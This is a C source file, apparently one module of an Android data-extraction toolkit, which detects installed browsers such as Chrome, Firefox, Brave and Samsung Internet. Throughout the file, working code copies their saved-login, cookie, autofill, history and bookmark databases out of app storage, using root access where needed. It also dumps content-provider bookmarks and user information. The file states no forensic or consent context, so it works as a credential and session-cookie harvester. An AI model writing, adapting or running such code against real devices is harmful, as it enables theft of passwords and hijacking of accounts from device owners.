// engine_09_browser.c - Browser data extraction (all browsers)
#include "common.h"
static int write_file_with_name(const char *dir, const char *name, const char *content) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return write_file(p, content);
}
static int dump_browser_db(const char *pkg, const char *dbname, const char *outdir, const char *label) {
    char path[MAX_PATH], dst[MAX_PATH];
    snprintf(path, sizeof(path), "/data/data/%s/databases/%s", pkg, dbname);
    snprintf(dst, sizeof(dst), "%s/%s_%s", outdir, label, dbname);
    save_with_root_fallback(path, dst);
    if (file_exists(dst) && file_size(dst) > 100) return 1;
    // Try Chrome-like paths
    snprintf(path, sizeof(path), "/data/data/%s/app_webview/%s", pkg, dbname);
    snprintf(dst, sizeof(dst), "%s/%s_aw_%s", outdir, label, dbname);
    save_with_root_fallback(path, dst);
    return (file_exists(dst) && file_size(dst) > 100) ? 1 : 0;
}
static int dump_browser_prefs(const char *pkg, const char *outdir, const char *label) {
    char path[MAX_PATH], dst[MAX_PATH]; int n = 0;
    const char *files[] = {
        "shared_prefs/%s.xml", "shared_prefs/com.android.browser_preferences.xml",
        "shared_prefs/WebViewChromiumPrefs.xml", "shared_prefs/DefaultProfilePrefs.xml",
        "app_webview/Default/Preferences", "app_webview/Default/Bookmarks",
        "app_webview/Default/History", "app_webview/Default/Cookies",
        NULL
    };
    char base[MAX_PATH]; snprintf(base, sizeof(base), "/data/data/%s", pkg);
    for (int i = 0; files[i]; i++) {
        char fn[MAX_PATH]; snprintf(fn, sizeof(fn), files[i], label);
        snprintf(path, sizeof(path), "%s/%s", base, fn);
        snprintf(dst, sizeof(dst), "%s/%s_%s", outdir, label, fn[0] == '%' ? fn + 2 : fn);
        char *clean = dst; while (*clean) { if (*clean == '/') *clean = '_'; clean++; }
        snprintf(dst, MAX_PATH, "%s/%s", outdir, dst);
        save_with_root_fallback(path, dst);
        if (file_exists(dst) && file_size(dst) > 0) n++;
    }
    return n;
}
int main(int argc, char **argv) {
    const char *outdir = argc > 1 ? argv[1] : ".";
    char res[MAX_PATH], jsonname[MAX_PATH], buf[65536];
    snprintf(res, sizeof(res), "%s/browser", outdir); mkdir_p(res);
    snprintf(jsonname, sizeof(jsonname), "%s/.engine_09.json", outdir); json_start(jsonname);
    int count = 0;
    // Browser packages
    const char *browsers[][3] = {
        {"com.android.chrome", "chrome", "Chrome"},
        {"com.chrome.beta", "chrome_beta", "Chrome Beta"},
        {"org.chromium.chrome", "chromium", "Chromium"},
        {"com.brave.browser", "brave", "Brave"},
        {"com.opera.browser", "opera", "Opera"},
        {"com.opera.mini.native", "opera_mini", "Opera Mini"},
        {"com.mozilla.firefox", "firefox", "Firefox"},
        {"com.microsoft.emmx", "edge", "Edge"},
        {"com.duckduckgo.mobile.android", "ddg", "DuckDuckGo"},
        {"com.vivaldi.browser", "vivaldi", "Vivaldi"},
        {"com.android.browser", "aosp_browser", "AOSP Browser"},
        {"com.samsung.android.browser", "samsung", "Samsung Internet"},
        {"com.sec.android.app.sbrowser", "samsung_legacy", "Samsung Internet Legacy"},
        {"com.miui.browser", "miui", "MIUI Browser"},
        {"com.android.webview", "webview", "WebView"},
        {NULL, NULL, NULL}
    };
    for (int i = 0; browsers[i][0]; i++) {
        // Check if installed
        char cmd[256]; snprintf(cmd, sizeof(cmd), "pm path %s 2>/dev/null || true", browsers[i][0]);
        if (run_cmd(cmd, buf, sizeof(buf)) < 0 || strlen(buf) < 5) continue;
        // Dump databases
        if (dump_browser_db(browsers[i][0], "WebView.db", res, browsers[i][1])) count++;
        if (dump_browser_db(browsers[i][0], "History.db", res, browsers[i][1])) count++;
        if (dump_browser_db(browsers[i][0], "LoginData", res, browsers[i][1])) count++;
        if (dump_browser_db(browsers[i][0], "Cookies", res, browsers[i][1])) count++;
        if (dump_browser_db(browsers[i][0], "Bookmarks", res, browsers[i][1])) count++;
        if (dump_browser_db(browsers[i][0], "Favicons", res, browsers[i][1])) count++;
        if (dump_browser_db(browsers[i][0], "Autofill", res, browsers[i][1])) count++;
        // Preferences
        count += dump_browser_prefs(browsers[i][0], res, browsers[i][1]);
    }
    // content query for browsers
    run_cmd("content query --uri content://browser/bookmarks 2>/dev/null | head -1000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "content_bookmarks.txt", buf); count++; }
    run_cmd("dumpsys user 2>/dev/null | head -500 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "dumpsys_user_browser.txt", buf); count++; }
    json_ki("files_extracted", count); json_end();
    printf("{\"engine\":\"browser\",\"status\":\"ok\",\"files\":%d}\n", count);
    return 0;
}
